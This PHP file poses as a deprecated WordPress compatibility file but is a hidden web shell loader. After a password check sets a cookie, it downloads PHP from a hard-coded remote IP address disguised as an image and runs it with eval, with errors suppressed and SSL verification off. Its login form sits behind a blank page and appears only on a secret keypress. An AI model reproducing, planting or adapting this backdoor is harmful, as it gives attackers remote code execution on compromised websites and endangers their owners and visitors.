<?php
/**
 * Conditionally declares a `readonly()` function, which was renamed
 * to `wp_readonly()` in WordPress 5.9.0.
 *
 * In order to avoid PHP parser errors, this function was extracted
 * to this separate file and is only included conditionally on PHP < 8.1.
 *
 * Including this file on PHP >= 8.1 results in a fatal error.
 *
 * @package WordPress
 * @since 5.9.0
 */

/**
 * Outputs the HTML readonly attribute.
 *
 * Compares the first two arguments and if identical marks as readonly.
 *
 * This function is deprecated, and cannot be used on PHP >= 8.1.
 *
 * @since 4.9.0
 * @deprecated 5.9.0 Use wp_readonly() introduced in 5.9.0.
 *
 * @see wp_readonly()
 *
 * @param mixed $readonly_value One of the values to compare.
 * @param mixed $current        Optional. The other value to compare if not just true.
 *                              Default true.
 * @param bool  $display        Optional. Whether to echo or just return the string.
 *                              Default true.
 * @return string HTML attribute or empty string.
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

error_reporting(0);
ini_set('display_errors', 0);

function is_logged_in() {
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
}

function get_remote_content($url) {
    if (function_exists("curl_init")) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists("file_get_contents")) {
        return @file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = @fopen($url, "r");
        if ($handle) {
            $data = stream_get_contents($handle);
            fclose($handle);
            return $data;
        }
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'http://156.67.221.29/hx.jpg'; // remote file
    $dream = get_remote_content($destiny);
    if ($dream !== false) {
        eval("?>".$dream);
    }
    exit;
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$Bfd4ZTYvIfgfGFLkcZjk3.Z6aCsG3wNmvr9YvVioNSB1GwfC66sXC'; // bcrypt hash

        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'LPH', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            background: #fff; 
            overflow: hidden;
            position: relative;
        }
        .login-container {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: #fff;
            padding: 20px;
            border: 1px solid #ccc;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            z-index: 1;
        }
        .login-container input {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        .snowflake {
            position: absolute;
            background: white;
            border-radius: 50%;
            width: 5px;
            height: 5px;
            opacity: 0.8;
            pointer-events: none;
            z-index: 0;
            animation: fall linear;
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
    </style>
</head>
<body>
    <div class="login-container" id="loginBox">
        <form method="POST" action="">
            <label for="password">
                Seven and thirteen dance together, to get The Sacred Ancient Entry Code seek the harmony between them to find the key.
            </label>
            <input type="password" id="password" name="password" autofocus>
            <input type="submit" value="acceso">
        </form>
    </div>

    <script>
        function createSnowflake() {
            const snowflake = document.createElement('div');
            snowflake.className = 'snowflake';
            snowflake.style.left = Math.random() * 100 + 'vw';
            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
            snowflake.style.opacity = Math.random();
            document.body.appendChild(snowflake);
            
            setTimeout(() => {
                snowflake.remove();
            }, 5000);
        }

        setInterval(createSnowflake, 100);

        document.addEventListener("keydown", function(e) {
            if (e.key === "End") {
                document.getElementById("loginBox").style.display = "block";
            }
        });
    </script>
</body>
</html>
